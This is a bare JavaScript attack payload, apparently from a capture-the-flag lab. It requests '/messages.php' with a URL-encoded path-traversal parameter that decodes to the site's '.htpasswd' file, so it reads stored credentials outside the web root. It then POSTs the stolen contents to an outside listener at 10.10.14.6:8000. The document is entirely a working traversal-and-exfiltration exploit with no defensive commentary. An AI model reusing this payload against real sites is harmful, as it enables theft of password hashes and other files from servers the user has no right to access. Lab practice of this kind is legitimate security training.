fetch("/messages.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%76%61%72%2f%77%77%77%2f%73%74%61%74%69%73%74%69%63%73%2e%61%6c%65%72%74%2e%68%74%62%2f%2e%68%74%70%61%73%73%77%64")
  .then(response => response.text())
  .then(data => {
    console.log("Fetched data:", data);
    fetch("http://10.10.14.6:8000", {
      method: "POST",
      headers: {
        "Content-Type": "text/plain"
      },
      body: data
    });
    return data;
  });